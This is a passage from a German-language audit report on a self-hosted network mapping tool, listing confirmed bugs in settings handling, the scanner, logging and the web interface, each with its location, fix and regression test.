- **Fix:** `scan_started_at` speichern, unhealthy bei Scandauer über das Größere aus 30 Minuten und 3 mal Intervall, `/api/scan/status` markiert veraltete Läufe. Der Healthcheck liest mit einer nur lesenden Verbindung. Sehr große Sweeps wie ein /22 mit Portscan brauchen eine großzügige Grenze.
- **Regressionstest:** `tests/test_health_status.py::test_stale_scanning_flag_is_unhealthy`
- **Hinweis:** K-9 aus W3 hierher verschoben: gleiche Behebung wie SF-3, braucht die Spalten aus SF-2. Prüfer stufte SF-3 von hoch auf niedrig herab.

#### `port_top` wird still bei 1040 Ports gekappt, Ports aus der Umgebung werden nicht geprüft (C-13)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W4
- **Ort:** `app/scanner/ports.py:8-13`, `app/api.py:402`
- **Was passiert:** `port_list(5000)` ergibt 1040 Ports ohne Hinweis. Ein Absturz bei Ports über 65535 ließ sich nicht nachstellen, auf Linux mit glibc könnte ein Port umbrechen, das war hier nicht prüfbar.
- **Fix:** Ports aus der Umgebung auf 1 bis 65535 prüfen und das Maximum 1040 für `port_top` dokumentieren.
- **Regressionstest:** `tests/test_discovery_paths.py::test_port_list_validates_range`
- **Hinweis:** Nur der Deckel ist bestätigt, die Behauptung eines Absturzes ist widerlegt.

#### Mehrere Fehlerpfade im Scanner schlucken Ausnahmen ohne Logzeile (SF-8, TL-1)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W4
- **Ort:** `app/scanner/discover.py:38`, `app/scanner/discover.py:57`, `app/scanner/discover.py:78`, `app/scanner/discover.py:117`, `app/scanner/discover.py:152`, `app/scanner/discover.py:179`, `app/scanner/snmp.py:21`, `app/scanner/topology.py:11`, `app/scanner/mdns.py:107`, `app/scanner/names.py:15,25,115,126,133`, `app/scanner/oui.py:73`, `app/scanner/tr064.py:120-129`
- **Was passiert:** Fehlen `ip`, `arp` oder `snmpwalk`, arbeitet der Scan still mit leeren Ergebnissen. Ein Fehler in `ping_host` selbst verschwindet an `discover.py:152` hinter `except Exception: pass` mit einem wirkungslosen `noqa`. Scheitert der WAN-Abruf, bleibt `wan_ip` vom letzten Lauf stehen.
- **Fix:** Eine WARNING je Lauf für die erste Gruppe, an `discover.py:152` `log.debug(..., exc_info=True)`, für die erwartbar lauten Namensauflösungen DEBUG. Bei einem WAN-Fehler `wan_ip` und `wan_status` löschen. Der TLS-Rückfall in `tr064.py:105-112` gehört zu S-2.
- **Regressionstest:** `tests/test_discovery_paths.py::test_missing_binaries_log_warning_once`
- **Hinweis:** Gruppenbefund. TL-1 ist der Eintrag `discover.py:152`. Der Rückfall in `tr064.py` ist in S-2 behandelt.

#### Der Entrypoint übergeht Fehler bei der chown-Prüfung ohne Meldung (SF-7)

- **Schwere:** niedrig · **Status:** bestätigt, aus Code belegt · **Welle:** W4
- **Ort:** `docker/entrypoint.sh:23-27`
- **Was passiert:** `find ... 2>/dev/null` in der Bedingung unterdrückt Fehler, `set -e` greift nicht, das `chown` wird übersprungen und der Datenbankfehler erscheint später. Betrifft exotische Volumes wie NFS mit root_squash.
- **Fix:** `2>/dev/null` entfernen oder eine Notiz ausgeben. Keine Nebenwirkung.
- **Regressionstest:** `tests/test_hardening.py::test_entrypoint_reports_chown_probe_failure`

#### PDF-Fehler mit angehängtem Bild werden als 422 „Bild nicht lesbar“ gemeldet, ohne Logzeile (N-4)

- **Schwere:** niedrig · **Status:** bestätigt, aus Code belegt · **Welle:** W4
- **Ort:** `app/api.py:318-321`
- **Was passiert:** Jede Ausnahme aus `exporters.build_pdf` wird bei vorhandenem Bild in 422 umgewandelt. Echte Serverfehler wie Datenbank oder reportlab erscheinen als Eingabefehler und stehen nirgends im Log.
- **Fix:** Nur Bildfehler fangen, also `UnidentifiedImageError` und `OSError` beim Öffnen, und als 422 melden. Alles andere mit `log.exception` und 500 durchlassen.
- **Regressionstest:** `tests/test_pdf_errors.py::test_pdf_internal_error_not_reported_as_422`
- **Hinweis:** Neu von der Prüfung stiller Fehler.

### 7.4 Einstellungen und Bausteine

Schema, Zusammenführung von Umgebung und Datenbank, Compose, MAC-Normalisierung, Logging.

#### Der Web-Prozess lädt gespeicherte Einstellungen beim Start nicht, eine in der Oberfläche eingeschaltete Anmeldung gilt nach einem Neustart nicht (C-1, K-7)

- **Schwere:** hoch · **Status:** bestätigt, nachgestellt · **Welle:** W1
- **Ort:** `app/web.py:25-37`, `app/api.py:498-508`, `app/api.py:347-350`
- **Was passiert:** Nach `PATCH` der Sites zeigt GET sie, ein neues `create_app`, die Aufbauroutine der Web-App, auf demselben Verzeichnis liefert `/api/sites` mit leeren Namen. Steht `NETZ_AUTH_ENABLED=false` in der Umgebung und die Oberfläche schaltet die Anmeldung ein, ist nach dem Neustart `GET /api/devices` offen, `GET /api/settings` zeigt weiter `true`.
- **Fix:** Eine gemeinsame `effective_settings(conn, base)` in `config.py`, die Umgebungs- und Datenbankwerte zusammenführt, für Web und Scanner, aufgerufen von `create_app` beim Start. Für `auth_enabled` gewinnt die Umgebung, sonst entfällt der Notausstieg. PATCH aktualisiert weiter `app.state.settings`, `get_settings` ist gecacht und geteilt. Die Übernahme braucht den Fix aus C-2.
- **Regressionstest:** `tests/test_settings_schema.py::test_web_applies_stored_settings_at_startup`, `tests/test_settings_schema.py::test_env_wins_for_auth_enabled`
- **Hinweis:** K-7 hat dieselbe Ursache: Einstellungen sind zwischen Web-UI, Web-Speicher und Scanner aufgespalten. `web.py` trägt der Orchestrator.

#### Das Einstellungsschema steht handkopiert an mindestens fünf Stellen (Q-1)

- **Schwere:** hoch · **Status:** bestätigt, aus Code belegt · **Welle:** W1
- **Ort:** `app/config.py:8`, `app/scanner/run.py:18-50`, `app/api.py:24`, `app/api.py:359`, `app/api.py:399`, `app/static/app.js`
- **Was passiert:** Eine neue Einstellung braucht Änderungen in der Settings-Klasse, in `OVERRIDABLE`, der Liste der Werte, die der Scanner aus der Datenbank übernimmt, in `SAFE_SETTINGS`, in `SettingsPatch`, in `validate_settings`, im Formular und in der README. Die Zusammenführung von Umgebung und Datenbank gibt es zweimal mit unterschiedlicher Semantik.
- **Fix:** Neues Modul `app/settings_schema.py` mit einer Tabelle `FIELDS` für Typ, Grenzen, Validator, Sichtbarkeit und Geheimhaltung, aus der `OVERRIDABLE`, `SAFE_SETTINGS`, `SettingsPatch` und die Validierung abgeleitet werden. Eine `effective_settings` für beide Prozesse, GET liefert getypte Werte.
- **Regressionstest:** `tests/test_settings_schema.py::test_every_setting_field_has_schema_entry`, `tests/test_settings_schema.py::test_effective_settings_typed_in_get`
- **Hinweis:** Grundbaustein von W1: C-1, C-2, C-3, N-2 und S-8 hängen daran. Die Wahl der Lösung ist laut Prüfer Ermessen.

#### `snmp_switches` lässt sich in der Oberfläche setzen, der Scanner ignoriert den Wert (N-2)

- **Schwere:** mittel · **Status:** bestätigt, aus Code belegt · **Welle:** W1
- **Ort:** `app/scanner/run.py:18-50`, `app/scanner/run.py:283`, `app/api.py:364`, `app/static/app.js:1312`
- **Was passiert:** Die Differenz aus `SettingsPatch` und `OVERRIDABLE` ist `{auth_enabled, snmp_switches}`. GET zeigt den gespeicherten Wert, der Scanner liest in `run.py:283` weiter den Umgebungswert.
- **Fix:** `snmp_switches` ins Schema aufnehmen, damit die Ableitung aus Q-1 die Lücke schließt. Ein Test sichert, dass jedes patchbare Feld im Scanner wirkt oder ausdrücklich nur den Web-Prozess betrifft.
- **Regressionstest:** `tests/test_settings_schema.py::test_patchable_fields_subset_of_scanner_overridable`
- **Hinweis:** Neu vom Korrektheits-Prüfer, dort als M-1 geführt.

#### Ein in der Oberfläche geleertes Feld bleibt wirkungslos, weil der leere String als „nicht gesetzt“ gilt (C-2)

- **Schwere:** mittel · **Status:** bestätigt, nachgestellt · **Welle:** W1
- **Ort:** `app/scanner/run.py:55-56`, `app/api.py:349`
- **Was passiert:** `PATCH notify_ntfy=""` speichert den leeren Wert, `effective_settings` nimmt trotzdem die Umgebung `http://ntfy/x`. `alarm_whitelist` verhält sich gleich.
- **Fix:** Für Textfelder `stored is not None` prüfen. Bestehende Datenbanken enthalten leere Altzeilen, weil `app.js` jedes Feld sendet, sie würden nach dem Update Umgebungswerte wie `fritz_url` oder `subnets` mit leer überschreiben. Deshalb leere Altzeilen per Migration löschen oder einen ausdrücklichen Löschwert einführen.
- **Regressionstest:** `tests/test_settings_schema.py::test_empty_string_overrides_env`, `tests/test_settings_schema.py::test_migration_drops_legacy_empty_rows`

#### Die Oberfläche zeigt `oui_online_enabled` als an, obwohl es gespeichert aus ist, weil der Text „false“ als wahr gilt (C-3)

- **Schwere:** mittel · **Status:** bestätigt, nachgestellt · **Welle:** W1
- **Ort:** `app/api.py:347-350`, `app/static/app.js:1537`, `app/static/app.js:1325`
- **Was passiert:** Nach dem Speichern von aus liefert GET den String `false`, `app.js:1537` wertet `!!s.oui_online_enabled` als wahr. Der nächste Speichervorgang sendet die Checkbox als an und schaltet die Herstellerabfrage bei Dritten wieder ein.
- **Fix:** Backend: GET liefert getypte Werte, Zahlen dann als Zahl statt Text. Frontend in W5: `String(x) === "true"` an `app.js:1537`. Zahlfelder setzen `.value`, das bleibt gültig.
- **Regressionstest:** `tests/test_settings_api.py::test_get_settings_returns_typed_bool`, `tests/ui/settings_form.mjs::oui_checkbox_reflects_false`
- **Hinweis:** Backend-Teil W1, Frontend-Teil W5.

#### Dokumentierte Umgebungsvariablen erreichen den Container nicht, weil `docker-compose.yml` nur eine feste Liste weitergibt (D-2)

- **Schwere:** mittel · **Status:** bestätigt, nachgestellt · **Welle:** W1
- **Ort:** `docker-compose.yml:1-30`, `app/config.py`, `app/db.py:111`
- **Was passiert:** Mit `docker compose config` gerendert fehlen 14 Variablen, darunter `NETZ_LANG`, `NETZ_TR064_INSECURE_TLS`, `NETZ_SQLITE_JOURNAL` und `NETZ_SITES`. Der README-Tipp `NETZ_SQLITE_JOURNAL=delete` und der Changelog-Eintrag zu `NETZ_TR064_INSECURE_TLS` wirken per `.env` nicht. Elf davon sind per Oberfläche änderbar.
- **Fix:** Die fehlenden Variablen in den Anker `x-netz-env` aufnehmen, `.env.example` mit allen Einstellungen und Defaults anlegen und einen Test ergänzen, dass jedes Feld aus `config.py` in der Compose-Liste steht. `NETZ_HOST` und `NETZ_PORT` gehören im Container auf eine Ausnahmeliste.
- **Regressionstest:** `tests/test_settings_schema.py::test_compose_passes_every_config_field`
- **Hinweis:** Prüfer stufte von hoch auf mittel herab: Der Rest ist per Oberfläche änderbar, `NETZ_TR064_INSECURE_TLS` scheitert geschlossen. Nicht per Oberfläche erreichbar: `NETZ_TR064_INSECURE_TLS`, `NETZ_EVENT_RETENTION_DAYS`, `NETZ_FRITZ_MESH`, `NETZ_SQLITE_JOURNAL`.

#### `validate_settings` ist eine Wenn-Dann-Leiter mit Komplexität 46 im Routenmodul (Q-2)

- **Schwere:** mittel · **Status:** bestätigt, aus Code belegt · **Welle:** W1
- **Ort:** `app/api.py:399-492`, `app/api.py:448`, `app/api.py:492`
- **Was passiert:** Die Prüfung dupliziert, was pydantic deklarativ leistet. Listen wie Subnetze, Sites, Whitelist, Switches und Ports werden hier ein zweites Mal geparst, neben `config.py` und `topology.vpn_pool_rules`. Meldungen sind fest deutsch, es kommt nur die erste.
- **Fix:** Kleine reine Prüffunktionen in `app/validation.py` wie `parse_subnets`, `parse_sites`, `parse_endpoint`, `parse_whitelist`, genutzt von Schema, `Settings` und Scanner, Wertebereiche über `Field(ge, le)`. Die bestehenden Fehlermeldungen bleiben bis zur Umstellung der Oberfläche wörtlich gleich.
- **Regressionstest:** `tests/test_settings_schema.py::test_validation_messages_unchanged`
- **Hinweis:** Die Zeilen der Schleifen sind 448 und 492, nicht 447 und 479.

#### Meldungen von mDNS und Benachrichtigung erreichen weder `netmap.log` noch die Log-Ansicht (Q-8)

- **Schwere:** mittel · **Status:** bestätigt, nachgestellt · **Welle:** W1
- **Ort:** `app/scanner/notify.py:5`, `app/scanner/mdns.py:16`, `app/logsetup.py:6`
- **Was passiert:** Die Logger `netmap.mdns` und `netmap.notify` sind keine Kinder des Loggers `fox_netmap`. WARNINGs erscheinen deshalb nur als nackte Notfallzeile auf stderr, INFO-Meldungen gehen ganz verloren.
- **Fix:** Umbenennen in `fox_netmap.mdns` und `fox_netmap.notify`, die Kinder erben die Handler. Optional `configure_logging(settings)` einmal je Prozess, Level über `NETZ_LOG_LEVEL`. Nebenwirkung: Die Zeilen erscheinen künftig im Log-Reiter, das ist gewollt.
- **Regressionstest:** `tests/test_logging.py::test_notify_and_mdns_warnings_reach_log_file`

#### Ungültige gespeicherte Einstellungen fallen still auf Standardwerte zurück (SF-4)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W1
- **Ort:** `app/scanner/run.py:55-60`
- **Was passiert:** `scan_timeout="abc"` und `scan_interval="5m"` ergeben 1.0 und 900 ohne Logzeile. Über die API sind die Werte geprüft, es entsteht nur durch manuelle DB-Eingriffe oder ältere Versionen.
- **Fix:** `log.warning(key, value)` im `except` von `effective_settings`.
- **Regressionstest:** `tests/test_settings_schema.py::test_invalid_stored_value_logs_warning`
- **Hinweis:** Prüfer stufte von mittel auf niedrig herab, die Kette „Tippfehler im Subnetz verengt den Scan“ ist widerlegt.

#### Die MAC-Normalisierung gibt es mehrfach, und der Geräte-Pfad der API ist groß-/kleinschreibungsempfindlich (Q-9, C-15)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W1
- **Ort:** `app/scanner/oui.py:12`, `app/scanner/notify.py:8`, `app/scanner/tr064.py:90`, `app/scanner/discover.py:67`, `app/api.py:149-157`, `app/api.py:202-215`
- **Was passiert:** `oui.normalize_mac` füllt Oktette nicht auf, `notify._norm_mac` schon, TR-064 setzt nur `lower()`. `GET /api/device/AA:00:00:00:00:01` liefert 404, klein geschrieben 200, betroffen sind nur Skripte. Die behauptete Folge „Whitelist verfehlt“ ist falsch, beide Seiten nutzen dieselbe Funktion.
- **Fix:** Modul `app/netutil.py` mit `normalize_mac`, das streng auf 6 aufgefüllte Oktette prüft und sonst `None` liefert, und `normalize_mac_key` für Pfadwerte, das klein schreibt, `-` zu `:` macht und `ip:`-Platzhalter lässt. Nie `oui.normalize_mac` auf Pfadwerte, es macht aus `ip:192.0.2.5` den Schlüssel `ip:192:0:2:5`.
- **Regressionstest:** `tests/test_netutil.py::test_normalize_mac_key_keeps_ip_placeholder`, `tests/test_api.py::test_device_path_case_insensitive`
- **Hinweis:** C-12 ist als erreichbarer Fehler widerlegt, die Funktion ist nur latent betroffen. Q-9 selbst plausibel, C-15 nachgestellt.

#### Platzhalter-Schlüssel `ip:<IP>` werden beim Speichern zu `ip:192:0:2:5` verstümmelt (N-3)

- **Schwere:** niedrig · **Status:** bestätigt, aus Code belegt · **Welle:** W1
- **Ort:** `app/scanner/run.py:298`, `app/static/app.js:1055`
- **Was passiert:** `oui.normalize_mac(d["mac"])` wird auch auf `ip:192.0.2.5` angewandt und speichert `ip:192:0:2:5` als Primärschlüssel. Der Tooltip in `app.js:1055` zeigt „192:0:2:5“. IPv6-Platzhalter sind nicht betroffen.
- **Fix:** Platzhalter vor der Normalisierung ausnehmen, oder die Funktion aus Q-9 nutzen, die sie unverändert lässt. Bestehende verstümmelte Schlüssel in einer Migration zurückschreiben oder durch die Aufbewahrung auslaufen lassen.
- **Regressionstest:** `tests/test_netutil.py::test_placeholder_key_not_mangled_in_collect`
- **Hinweis:** Neu vom Korrektheits-Prüfer, dort als M-2 geführt. Die Zeile im HEAD ist 298, der Prüfer nannte 295.

### 7.5 Oberfläche

Fehlerbehandlung, Zustand, Tastatur, Kontrast, Embed-Ansicht.

#### Fehlgeschlagene Speichervorgänge in der Oberfläche gelten als Erfolg, es gibt keine Fehlermeldung (F-3, SF-6)

- **Schwere:** mittel · **Status:** bestätigt, nachgestellt · **Welle:** W5
- **Ort:** `app/static/app.js:759`, `app/static/app.js:820`, `app/static/app.js:828`, `app/static/app.js:1072`, `app/static/app.js:1078`, `app/static/app.js:1086`, `app/static/app.js:1466`, `app/static/app.js:1495`, `app/static/app.js:1567`, `app/static/app.js:1597`
- **Was passiert:** `api()` behandelt nur 401, die Aufrufer prüfen `r.ok` nicht. Ein Elternknoten, der einen Zyklus erzeugt, liefert 422, die Oberfläche lädt neu und zeigt still den alten Wert. Eine Notiz über 2000 Zeichen oder ein 404 nach der Aufbewahrung geht ebenso verloren.
- **Fix:** Zentrales `api()` oder `apiJson` in `app/static/api.js`, das bei `!ok` und Netzwerkfehler wirft, dazu eine Meldung mit `t("msg.rejected")` samt Detail, die Eingabe bleibt erhalten. Aufrufer, die sich auf `if (!r.ok) return` verlassen, im selben Schritt anpassen. Neu laden nur bei Erfolg.
- **Regressionstest:** `tests/ui/api_errors.mjs::patch_422_shows_message`
- **Hinweis:** F-3 und SF-6 sind derselbe Fehler aus zwei Prüfungen.

#### Netzwerkfehler beim Start lassen die Oberfläche leer und ohne Bedienung (F-4)

- **Schwere:** mittel · **Status:** bestätigt, nachgestellt · **Welle:** W5
- **Ort:** `app/static/app.js:278-284`, `app/static/app.js:1503`, `app/static/app.js:1600-1644`
- **Was passiert:** Wirft `/api/meta` während `init()`, entsteht eine unbehandelte Ablehnung, `/api/devices` wird nie geladen und der Scan-Knopf hat keinen Handler. `pollScanStatus` erzeugt alle 5 s eine unbehandelte Ablehnung, wenn der Server fehlt.
- **Fix:** `try/catch` in `api()`, Handler vor den `await`-Aufrufen binden, ein Offline-Banner anzeigen. Dieselbe Hilfsfunktion wie bei F-3.
- **Regressionstest:** `tests/ui/api_errors.mjs::init_survives_meta_failure`

#### Eine Aktualisierung zerstört die laufende Eingabe in der Tabelle (F-2)

- **Schwere:** mittel · **Status:** bestätigt, nachgestellt · **Welle:** W5
- **Ort:** `app/static/app.js:1074-1090`, `app/static/app.js:364-371`, `app/static/app.js:1504`
- **Was passiert:** Ändert man ein Eingabefeld, löst das ein PATCH aus, danach baut `loadDevices` die Tabelle neu. Das nächste Feld, in das man per Tab gewechselt ist, wird ersetzt: Text leer, Fokus auf BODY. Tab-Navigation durch Raum und Notiz ist damit kaputt.
- **Fix:** Beim Neuaufbau Fokus und Wert nach MAC und Spalte wiederherstellen, oder die Zeilen an Ort und Stelle patchen, solange der `tbody` den Fokus hat.
- **Regressionstest:** `tests/ui/table_edit.mjs::tab_through_edit_keeps_focus`
- **Hinweis:** Betrifft nicht nur den seltenen Fall eines Scan-Endes.

#### Gezogene Knotenpositionen werden im Auto-Layout bei jeder Aktualisierung verworfen (F-5)

- **Schwere:** mittel · **Status:** bestätigt, nachgestellt · **Welle:** W5
- **Ort:** `app/static/app.js:149-156`, `app/static/app.js:517-523`, `app/static/app.js:756-760`
- **Was passiert:** Sind alle IP-Geräte positioniert und ein verstecktes Gerät ohne IP nicht, wählt die Karte ein Baum-Layout und ignoriert die gespeicherten x/y. Das Handbuch nennt die Regel, ein neu entdecktes Gerät bricht sie dauerhaft.
- **Fix:** Je Knoten gespeicherte x/y verwenden und nur unpositionierte Knoten per Baum platzieren.
- **Regressionstest:** `tests/ui/layout_positions.mjs::saved_positions_survive_unpositioned_node`
- **Hinweis:** Design im Handbuch beschrieben, praktisch unerreichbar.

#### Jede Aktualisierung baut den ganzen Graphen neu und passt die Ansicht an, das Detailfenster zeigt danach Geisterdaten (F-6)

- **Schwere:** mittel · **Status:** bestätigt, nachgestellt · **Welle:** W5
- **Ort:** `app/static/app.js:766-772`, `app/static/app.js:170`
- **Was passiert:** Der Refresh führt `remove`, `add`, `layout`, `fit` aus. Verschwindet das gezeigte Gerät, bleibt das Detailfenster samt `#ed-delete` für eine nicht vorhandene MAC offen. Zoom und Ausschnitt springen zurück.
- **Fix:** `cy.fit` nur beim ersten Rendern oder bei Layoutwechsel, Zoom beibehalten. Ist die MAC weg, das Detailfenster schließen oder neu zeichnen.
- **Regressionstest:** `tests/ui/map_refresh.mjs::refresh_keeps_viewport_and_closes_stale_detail`

#### Enter auf einem Link in der Tabellenzeile wird verschluckt, Sortieren geht nur mit der Maus (F-8)

- **Schwere:** mittel · **Status:** bestätigt, nachgestellt · **Welle:** W5
- **Ort:** `app/static/app.js:918-923`, `app/static/app.js:866-884`
- **Was passiert:** Enter auf `a.ext-link` setzt `defaultPrevented` und öffnet das Detailfenster, der Wächter schließt nur SELECT und INPUT aus. Die `th` haben weder `tabindex` noch `role` noch `aria-sort`. Das Projekt strebt WCAG 2.1 AA an, siehe `docs/01-anforderungen.md:103`.
- **Fix:** Ereignisse mit `e.target.closest("a,button,select,input")` ignorieren, Kopfzellen fokussierbar machen und mit `aria-sort` versehen.
- **Regressionstest:** `tests/ui/keyboard.mjs::enter_on_link_not_swallowed`, `tests/ui/keyboard.mjs::headers_sortable_by_keyboard`

#### Die Seitenleiste hat keine Fokusführung, kein Escape und unvollständige Beschriftungen (F-9)

- **Schwere:** mittel · **Status:** bestätigt, nachgestellt · **Welle:** W5
- **Ort:** `app/static/app.js:290-318`, `app/static/app.js:830-841`, `app/static/app.js:1070-1078`, `app/static/index.html:94-99`
- **Was passiert:** Es gibt nur zwei `.focus()`-Aufrufe, Escape löscht nur den Spotlight. Die Felder `#ed-note`, `#ed-cat`, `#ed-parent` sowie Notiz und Kategorie in der Tabelle haben kein `aria-label`.
- **Fix:** Fokus beim Öffnen setzen und beim Schließen zurückgeben, Escape schließt, Beschriftungen und `aria-controls` ergänzen.
- **Regressionstest:** `tests/ui/focus_a11y.mjs::sidebar_focus_and_escape`

#### `app.js` ist ein 1647-Zeilen-Skript mit globalem Zustand und zusammengebautem HTML (Q-10)

- **Schwere:** mittel · **Status:** bestätigt, aus Code belegt · **Welle:** W5
- **Ort:** `app/static/app.js`, `app/static/index.html:189-192`
- **Was passiert:** API-Client, Zustand, Tabelle, Karte, Detail, Einstellungen, Log und Polling stehen in einer Datei, 74 Funktionen und 55 `addEventListener`. Ein vergessenes `esc()` wäre eine XSS-Lücke, `t("d.edit")` an `app.js:800` ist unescaped und nur durch vertrauenswürdige Übersetzungen sicher.
- **Fix:** In dieser Kampagne nur den API-Client nach `app/static/api.js` auslagern, gemeinsam mit F-3. Die Zerlegung in ES-Module bleibt ausdrücklich ausgelassen und ist eine Entscheidung für nach v1.7.
- **Regressionstest:** entfällt, kein Fehlverhalten, `node tests/ui_dom_check.mjs` bleibt als Charakterisierung unverändert grün
- **Hinweis:** Es gibt 61 `esc(`-Stellen statt 26. Der Rest der Zerlegung bleibt ausgelassen.

#### Bei überlappenden Ladeanfragen gewinnt die zuletzt eintreffende Antwort, nicht die zuletzt gestellte (F-1)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W5
- **Ort:** `app/static/app.js:364-371`
- **Was passiert:** Trifft eine ungefilterte Antwort nach der gefilterten ein, zeigt die Tabelle alte Daten, während im Suchfeld der neue Begriff steht. Heilt sich beim nächsten Refresh selbst.
- **Fix:** Einen Zähler je `loadDevices` und `showDetail` führen und veraltete Antworten verwerfen.
- **Regressionstest:** `tests/ui/api_errors.mjs::stale_response_ignored`
- **Hinweis:** Prüfer stufte von mittel auf niedrig herab: Überlappung braucht Latenz, Suche ist entprellt.

#### Die Kartenberechnung wächst kubisch, ab 1000 Geräten steht die Oberfläche (F-7)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W5
- **Ort:** `app/static/app.js:79-81`, `app/static/app.js:441-448`, `app/static/app.js:536`
- **Was passiert:** In einer Sterntopologie braucht `renderMap` bei 250 Geräten 120 ms, bei 500 Geräten 992 ms, bei 1000 Geräten 8,2 s, weil `childCount` je Knoten `parentId` mit `devices.some` aufruft. Beim Ziel von 200 Geräten kein Problem.
- **Fix:** Karten für MAC, IP, Hostname und Kinderzahlen einmal je Render berechnen.
- **Regressionstest:** `tests/ui/render_perf.mjs::render_1000_devices_under_budget`

#### Druck im dunklen Thema ist unlesbar, Log-Stufen und VPN-Badge liegen unter dem Kontrastminimum (F-10, F-11)

- **Schwere:** niedrig · **Status:** bestätigt, aus Code belegt · **Welle:** W5
- **Ort:** `app/static/styles.css:335-342`, `app/static/styles.css:220`, `app/static/styles.css:318`, `app/static/styles.css:328-331`, `app/static/styles.css:251`
- **Was passiert:** Der Druckblock setzt keine Farben zurück und die Zellen bleiben `nowrap`. Kontrast gegen `#f8fafc`: WARN 1,60, INFO 2,05, ERROR 2,64, DEBUG 2,45, VPN 2,05, gefordert sind 4,5.
- **Fix:** Im Druckblock helle Variablen erzwingen und `white-space: normal` setzen, für Log-Stufen und Badge themenabhängige Farben einführen.
- **Regressionstest:** `tests/test_a11y_css.py::test_log_level_and_badge_contrast`, `tests/test_a11y_css.py::test_print_block_forces_light_theme`
- **Hinweis:** F-10 vom Prüfer von mittel auf niedrig herabgestuft: Das helle Thema ist ein Umweg.

#### Die eingebettete Ansicht zeigt wirkungslose Bedienelemente und Exportlinks ohne Token (F-12)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W5
- **Ort:** `app/static/styles.css:267-275`, `app/static/index.html:51-56`, `app/static/index.html:128-131`, `app/static/app.js:1235`, `app/web.py:49-52`, `app/static/login.js:6`
- **Was passiert:** Im `/embed?token=abc` sind JSON-, CSV- und PDF-Knopf sowie Bearbeiten sichtbar, der Umschalter setzt `aria-pressed=true` ohne Editor. Die Selektoren `#exp-json` und `#exp-csv` treffen nichts, die Links tragen kein `?token`, ein anonymer Betrachter bekommt 401.
- **Fix:** IDs ergänzen, `.table-tools` und `#btn-pdf` im Embed ausblenden, den Token an Exportlinks hängen, die Sprachwahl in `login.js` und `app.js` angleichen.
- **Regressionstest:** `tests/ui/embed_mode.mjs::embed_hides_edit_and_tokens_exports`

#### Fest deutsche Texte, nicht formatierte Datumswerte und ungeprüfte Übersetzungsschlüssel (F-13, F-14, Q-11)

- **Schwere:** niedrig · **Status:** plausibel · **Welle:** W5
- **Ort:** `app/static/app.js:1055`, `app/static/app.js:1272`, `app/static/app.js:1343`, `app/static/app.js:797-798`, `app/static/app.js:1503-1513`, `app/static/index.html:19-22`, `app/static/index.html:26-27`, `app/static/index.html:31`, `app/static/index.html:165`, `app/static/i18n.js`
- **Was passiert:** Fest deutsch sind „nur IP bekannt“, „Netzwerkkarte“, „Fehler beim Speichern“, „Scan-Status“ und „0 ausgewählt“, und `t()` fällt still auf den Schlüssel zurück. Zeitstempel erscheinen als ISO-Text. In den fünf Nicht-Deutsch-Sprachen sind 21 bis 41 Werte identisch mit Englisch, teils Fachwort, teils unübersetzt.
- **Fix:** Texte in Schlüssel umziehen, ein `Intl.DateTimeFormat(LANG)`-Helfer für Daten, ein Test auf gleiche Schlüsselmengen und darauf, dass jede Kategorie einen `cat.*`-Schlüssel hat. Die drei `login.*`-Schlüssel bleiben, sie sind in Gebrauch.
- **Regressionstest:** `tests/ui/i18n_parity.mjs::all_languages_same_keys_and_cat_keys`
- **Hinweis:** Q-11 teilweise widerlegt: `login.user`, `login.pass`, `login.btn` sind nicht unbenutzt. Neue Schlüssel trägt der Orchestrator in `i18n.js` ein.

#### Das Einstellungsfenster leert Felder beim Tabwechsel, und das gespeicherte Thema wird nie angewandt (F-15)

- **Schwere:** niedrig · **Status:** bestätigt, nachgestellt · **Welle:** W5
- **Ort:** `app/static/app.js:1297-1347`, `app/static/app.js:1520-1530`, `app/static/app.js:290-318`, `app/static/app.js:329`
- **Was passiert:** Nach `showDetail` und Wechsel zu Einstellungen wird das Feld `subnets` auf leer zurückgesetzt, weil `activateTab` neu lädt. Die Einstellung `theme` wird gespeichert, aber nirgends angewandt, nur `localStorage` zählt. `settings-msg` wird nie gelöscht.
- **Fix:** Einstellungen einmal je Öffnen laden, `theme` entweder anwenden oder aus dem Formular entfernen, die Meldung beim Tabwechsel löschen. Hier auch die Schaltfläche „Löschen“ für Secrets aus S-8.
- **Regressionstest:** `tests/ui/settings_form.mjs::form_not_reset_on_tab_change`
- **Hinweis:** Der Teilbefund einer zurückgesetzten Sprache ist widerlegt: `setLang` gleicht `#st-lang` an.

#### Mobile Ansicht: feste Höhe `100vh`, keine schmale Variante, Log-Status wird immer geschrieben (F-16)

- **Schwere:** niedrig · **Status:** bestätigt, aus Code belegt · **Welle:** W5
- **Ort:** `app/static/styles.css:36-47`, `app/static/app.js:1212`, `app/static/app.js:1501`, `app/static/app.js:1556-1594`
- **Was passiert:** Es gibt keine Breiten-Media-Query, `body` hat `100vh`, `loadLogs` schreibt `#log-status` ohne Prüfung und `pollScanStatus` hat keinen Schutz gegen überlappende Läufe. Auf einem Gerät nicht geprüft.
- **Fix:** `100dvh`, ein Breakpoint für schmale Anzeigen, Schreibschutz für `#log-status`, Schutz gegen überlappende Abfragen.
- **Regressionstest:** `tests/ui/layout_responsive.mjs::narrow_viewport_stacks_panels`

#### Toter Code und ungenutzte `catch`-Variablen in `app.js` (TL-4)

- **Schwere:** niedrig · **Status:** bestätigt, aus Code belegt · **Welle:** W5
- **Ort:** `app/static/app.js:75`, `app/static/app.js:118`, `app/static/app.js:130`, `app/static/app.js:980`, `app/static/app.js:1344`, `app/static/app.js:1414`
- **Was passiert:** `groupOf` wird nie aufgerufen, vier `catch (e)` nutzen `e` nicht, ein `\-` an `:1414` ist überflüssig. Ohne JS-Lint im CI sammelt sich toter Code an. Werkzeuglauf des Finders, nicht erneut geprüft.
- **Fix:** `groupOf` löschen, `catch {` ohne Variable, das überflüssige Escape entfernen.
- **Regressionstest:** entfällt, kein Verhalten, die ESLint-Regel `no-unused-vars` im Gate aus W0 ersetzt den Test

#### Das mitgelieferte Cytoscape 3.30.2 steht fünf Minor-Versionen hinter 3.35.0 und wird nicht überwacht (D-5)

- **Schwere:** niedrig · **Status:** bestätigt, aus Code belegt · **Welle:** W5
